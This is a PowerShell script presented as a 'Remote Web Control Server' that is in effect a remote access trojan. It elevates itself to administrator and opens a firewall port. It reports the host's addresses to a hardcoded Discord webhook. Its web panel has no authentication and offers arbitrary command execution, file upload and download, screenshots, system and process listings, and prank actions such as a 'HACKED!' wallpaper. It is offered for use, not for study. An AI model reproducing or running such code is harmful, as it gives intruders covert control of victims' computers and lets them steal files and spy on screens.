# Remote Web Control Server
$webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
$port = 8080

# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Restart as administrator
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# Open firewall port
try {
    netsh advfirewall firewall add rule name="WebRemote" dir=in action=allow protocol=TCP localport=$port
} catch {
    # Continue even if firewall fails
}

# Create temp directory
if (!(Test-Path "C:\temp")) {
    New-Item -ItemType Directory -Path "C:\temp" -Force
}

# Get all accessible IPs
$ips = @()
$ips += (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE" | ForEach-Object { $_.IpAddress }) | Where-Object { $_ -match "^\d+\.\d+\.\d+\.\d+$" }
$ips += "127.0.0.1"

# Send IP info to Discord
try {
    $ipList = $ips -join "\n"
    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
} catch {
    # If Discord fails, continue anyway
}

# HTML Interface
$html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Remote Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
        .container { max-width: 800px; margin: 0 auto; }
        .section { background: #2d2d2d; padding: 20px; margin: 10px 0; border-radius: 5px; }
        input, textarea, button { width: 100%; padding: 10px; margin: 5px 0; border: none; border-radius: 3px; }
        input, textarea { background: #404040; color: #fff; border: 1px solid #555; }
        button { background: #4CAF50; color: white; cursor: pointer; }
        button:hover { background: #45a049; }
        .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
        .file-upload { border: 2px dashed #555; padding: 20px; margin: 10px 0; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Remote Control Panel</h1>
        
        <div class="section">
            <h3>Command Terminal</h3>
            <form action="/cmd" method="post" id="cmdForm">
                <input type="text" name="command" placeholder="Enter PowerShell command..." required id="cmdInput">
                <button type="submit">Execute</button>
            </form>
        </div>

        <div class="section">
            <h3>File Manager</h3>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <div class="file-upload">
                    <input type="file" name="file" required>
                    <button type="submit">Upload File</button>
                </div>
            </form>
            <form action="/download" method="post">
                <input type="text" name="filepath" placeholder="Enter file path to download..." required>
                <button type="submit">Download File</button>
            </form>
        </div>

        <div class="section">
            <h3>Actions</h3>
            <form action="/screenshot" method="post">
                <button type="submit">Take Screenshot</button>
            </form>
            <form action="/info" method="post">
                <button type="submit">System Info</button>
            </form>
            <form action="/processes" method="post">
                <button type="submit">List Processes</button>
            </form>
        </div>

        <div class="section">
            <h3>Troll Options</h3>
            <form action="/notepad" method="post">
                <button type="submit">Open Notepad</button>
            </form>
            <form action="/calculator" method="post">
                <button type="submit">Open Calculator</button>
            </form>
            <form action="/paint" method="post">
                <button type="submit">Open Paint</button>
            </form>
            <form action="/cmd" method="post">
                <button type="submit">Open Command Prompt</button>
            </form>
            <form action="/taskmgr" method="post">
                <button type="submit">Open Task Manager</button>
            </form>
            <form action="/explorer" method="post">
                <button type="submit">Open File Explorer</button>
            </form>
            <form action="/browser" method="post">
                <button type="submit">Open Browser</button>
            </form>
            <form action="/message" method="post">
                <input type="text" name="msgtext" placeholder="Enter message to show..." required>
                <button type="submit">Show Message Box</button>
            </form>
            <form action="/wallpaper" method="post">
                <button type="submit">Change Wallpaper</button>
            </form>
            <form action="/volume" method="post">
                <button type="submit">Max Volume</button>
            </form>
        </div>

        <div class="output" id="output">Welcome to Remote Control Panel</div>
    </div>

    <script>
        // Auto-refresh output
        setInterval(function() {
            fetch('/output')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('output').innerHTML = data;
                });
        }, 2000);
        
        // Handle command form submission
        document.getElementById('cmdForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const command = document.getElementById('cmdInput').value;
            const formData = new FormData();
            formData.append('command', command);
            
            fetch('/cmd', {
                method: 'POST',
                body: formData
            }).then(() => {
                document.getElementById('cmdInput').value = '';
            });
        });
    </script>
</body>
</html>
"@

# HTTP Server
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()

$outputBuffer = ""

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    try {
        switch ($request.Url.LocalPath) {
            "/" {
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/cmd" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $command = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    
                    try {
                        $result = Invoke-Expression $command | Out-String
                        $outputBuffer = "Command: $command`n`nResult:`n$result`n"
                    } catch {
                        $outputBuffer = "Error executing command: $_`n"
                    }
                    
                    $response.ContentType = "text/html"
                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                    $response.ContentLength64 = $buffer.Length
                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                }
            }
            
            "/upload" {
                if ($request.HttpMethod -eq "POST") {
                    try {
                        $contentType = $request.ContentType
                        $boundary = $contentType.Split('boundary=')[1]
                        $data = New-Object System.IO.BinaryReader($request.InputStream).ReadBytes($request.ContentLength64)
                        $encoding = [System.Text.Encoding]::UTF8
                        $dataString = $encoding.GetString($data)
                        
                        # Simple file extraction
                        if ($dataString -match 'filename="([^"]+)"') {
                            $filename = $matches[1]
                            $filePath = "C:\temp\$filename"
                            [System.IO.File]::WriteAllBytes($filePath, $data)
                            $outputBuffer += "File uploaded: $filePath`n"
                        }
                    } catch {
                        $outputBuffer += "Upload failed: $_`n"
                    }
                    $response.ContentType = "text/html"
                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                    $response.ContentLength64 = $buffer.Length
                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                }
            }
            
            "/download" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $filepath = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    if (Test-Path $filepath) {
                        $response.ContentType = "application/octet-stream"
                        $response.AddHeader("Content-Disposition", "attachment; filename=$(Split-Path $filepath -Leaf)")
                        $buffer = [System.IO.File]::ReadAllBytes($filepath)
                        $response.ContentLength64 = $buffer.Length
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    } else {
                        $response.ContentType = "text/plain"
                        $buffer = [System.Text.Encoding]::UTF8.GetBytes("File not found")
                        $response.ContentLength64 = $buffer.Length
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    }
                }
            }
            
            "/screenshot" {
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                    
                    # Convert to base64 for direct display
                    $memoryStream = New-Object System.IO.MemoryStream
                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                    $imageBytes = $memoryStream.ToArray()
                    $base64Image = [System.Convert]::ToBase64String($imageBytes)
                    
                    $outputBuffer += "<img src='data:image/png;base64,$base64Image' style='max-width:100%; height:auto;' />`n"
                    $outputBuffer += "Screenshot captured successfully!`n"
                } catch {
                    $outputBuffer += "Screenshot failed: $_`n"
                }
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/info" {
                $info = @"
System Information:
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
IPs: $($ips -join ', ')
"@
                $outputBuffer += $info
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/processes" {
                $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
                $outputBuffer += "Running Processes:`n$processes`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/notepad" {
                Start-Process notepad
                $outputBuffer += "Notepad opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/calculator" {
                Start-Process calc
                $outputBuffer += "Calculator opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/paint" {
                Start-Process mspaint
                $outputBuffer += "Paint opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/taskmgr" {
                Start-Process taskmgr
                $outputBuffer += "Task Manager opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/explorer" {
                Start-Process explorer
                $outputBuffer += "File Explorer opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/browser" {
                Start-Process chrome -ErrorAction SilentlyContinue
                if (-not $?) { Start-Process msedge -ErrorAction SilentlyContinue }
                if (-not $?) { Start-Process firefox -ErrorAction SilentlyContinue }
                $outputBuffer += "Browser opened!`n"
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/message" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $message = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.MessageBox]::Show($message, "Message", "OK", "Information")
                    $outputBuffer += "Message box shown: $message`n"
                }
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/wallpaper" {
                try {
                    $wallpaperPath = "$env:TEMP\wallpaper.jpg"
                    Add-Type -AssemblyName System.Drawing
                    $bitmap = New-Object System.Drawing.Bitmap(1920, 1080)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.Clear([System.Drawing.Color]::Red)
                    $font = New-Object System.Drawing.Font("Arial", 50)
                    $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
                    $graphics.DrawString("HACKED!", $font, $brush, 700, 500)
                    $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $wallpaperPath
                    rundll32.exe user32.dll,UpdatePerUserSystemParameters
                    $outputBuffer += "Wallpaper changed!`n"
                } catch {
                    $outputBuffer += "Failed to change wallpaper: $_`n"
                }
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/volume" {
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    for ($i = 0; $i -lt 50; $i++) {
                        [System.Windows.Forms.SendKeys]::SendWait("{VOLUME_UP}")
                        Start-Sleep -Milliseconds 50
                    }
                    $outputBuffer += "Volume maxed out!`n"
                } catch {
                    $outputBuffer += "Failed to change volume: $_`n"
                }
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/output" {
                $response.ContentType = "text/plain"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($outputBuffer)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
        }
    } catch {
        $response.ContentType = "text/plain"
        $buffer = [System.Text.Encoding]::UTF8.GetBytes("Error: $_")
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }
    
    $response.Close()
}

# Keep server running indefinitely
try {
    while ($true) {
        Start-Sleep -Seconds 1
    }
} catch {
    $listener.Stop()
}
